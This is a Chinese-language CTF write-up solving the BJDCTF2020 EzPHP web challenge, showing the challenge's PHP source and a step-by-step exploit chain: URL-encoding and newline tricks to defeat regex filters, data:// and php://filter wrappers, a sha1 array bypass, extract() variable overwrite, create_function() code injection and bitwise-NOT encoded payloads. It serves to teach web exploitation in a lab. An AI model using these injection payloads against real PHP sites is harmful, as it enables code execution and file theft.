---
title: BJDCTF2020-EzPHP
date: 2025-04-15 22:02:22
tags:
- 代码审计
- php特性
- sha1绕过
- extract
- $_SERVER['QUERY_STRING']
- preg_match
- create_function()
- 取反绕过单双引号过滤
category:
- 刷题笔记
---

# BJDCTF2020-EzPHP

首先打开靶机，没发现什么信息，查看源码，发现提示

```
<!-- Here is the real page =w= -->
<!-- GFXEIM3YFZYGQ4A= -->
```

一个等号，推测是base32编码，解码之后发现新的php文件

```
1nD3x.php
```

访问1nD3x.php

源码：

```
<?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
This is a very simple challenge and if you solve it I will give you a flag. Good Luck!
Aqua is the cutest five-year-old child in the world! Isn't it ?
```

---

代码审计

## $_server[‘QUERY_STRING’]

```
if($_SERVER) { 
    if (
  preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}
```

**目的**：判断url参数有无关键字

**特性**：它不会对url编码进行解码。所以这里直接编码就可以绕过

**绕过：**对payload进行url编码即可

## preg_match

```
if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');
```

**目的**：get传的file参数不能有http、https、debu参数必须以aqua_is_cute开头且结尾，而又不能等于aqua_is_cute

**绕过**：debu=aqua_is_cute%00（用%00截断，或在后面加%0a等等换行符或空格），只会匹配第一行加%0a换行符即可

## $_REQUEST

```
if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 
```

**目的**：参数的值不能包含字母

**特性**：**`它接收$_GET和$_POST的数据，如果get和post一样的参数名，它会优先选择post形式传入的参数的值**

**绕过**：get正常传值，在post传值时有同名参数传数字就行

## file_get_contents

```
if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");
```

使用data://伪协议绕过即可

```
get：
file=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&debu=aqua_is_cute%0a

post：
file=1&debu=1
```

记得编码。为了绕过第一关

```
get:
file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%3B%62%61%73%65%36%34%2C%5A%47%56%69%64%56%39%6B%5A%57%4A%31%58%32%46%78%64%57%45%3D&%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0a

post：
file=1&debu=1
```

成功绕过

## sha1 & extract

```
if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}
```

**绕过**：sha1传数组会被转化为Null

**extract($_GET["flag"])的利用**：extract可以进行变量覆盖，刚好看到下面的正则对code进行过滤，但实际code为空，所以我们肯定要借助extract对code进行赋值

使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量，所以这里我们可以传数组，即`flag[code]`和`flag[arg]`的形式

## create_function()代码注入

```
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
```

### create_function()

`create_function()`函数有两个参数`$args`和`$code`，用于创建一个lambda样式的函数

```
$myfunc = create_function('$a, $b', 'return $a+$b;');
```

相当于：

```
function myfunc($a, $b){
    return $a+$b;
}
```

但是如果第二个参数没有限制（`$code=return$a+$b;}eval($_POST['cmd']);//`），就会变成：

```
function myfunc($a, $b){
  return $a+$b;
}
eval($_POST['cmd']);//}
```

通过手工闭合`}`使后面的代码`eval()`逃逸出了`myFunc()`得以执行，然后利用注释符`//`注释掉`}`保证了语法正确。

**绕过**： 根据`$code('', $arg);` 的形式，我们需要将code构造为creat_function，arg将前面闭合然后进行代码执行

payload:

```
【GET】file=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&debu=aqua_is_cute%0a&shana[]=1&passwd[]=2&flag[code]=create_function&flag[arg]=}var_dump(get_defined_vars());//
#get_defined_vars — 返回所有已定义变量的数组
【POST】file=1&debu=2
```

编码：


```
【GET】file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%3B%62%61%73%65%36%34%2C%5A%47%56%69%64%56%39%6B%5A%57%4A%31%58%32%46%78%64%57%45%3D&%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0a&%73%68%61%6E%61[]=1&%70%61%73%73%77%64[]=2&%66%6C%61%67[%63%6F%64%65]=create_function&%66%6C%61%67[%61%72%67]=}var_dump(get_defined_vars());//

POST：file=1&debu=2
```

输出的最后有一句话：

```
Baka, do you think it's so easy to get my flag? I hid the real flag in rea1fl4g.php 23333" }
```

## 读取flag

### 取反

 提示了flag在rea1fl4g.php里，所以考虑用require函数(或fopen和fgets)，php//filter读取文件

```
require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)
```

考虑用filter流读取flag文件，又因为“inc”、单引号、双引号都被过滤了，所以考虑用require代替include，按位取反绕过单双引号的限制。

```
require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//
```

总payload:

```
【GET】?file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%3B%62%61%73%65%36%34%2C%5A%47%56%69%64%56%39%6B%5A%57%4A%31%58%32%46%78%64%57%45%3D&%64%65%62%75=%61%71%75%61_is_%63%75%74%65%0a&%73%68%61%6E%61[]=1&%70%61%73%73%77%64[]=2&%66%6C%61%67[%63%6F%64%65]=create_function&%66%6C%61%67[%61%72%67]=}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));//
POST：file=1&debu=2
```

解码拿到flag







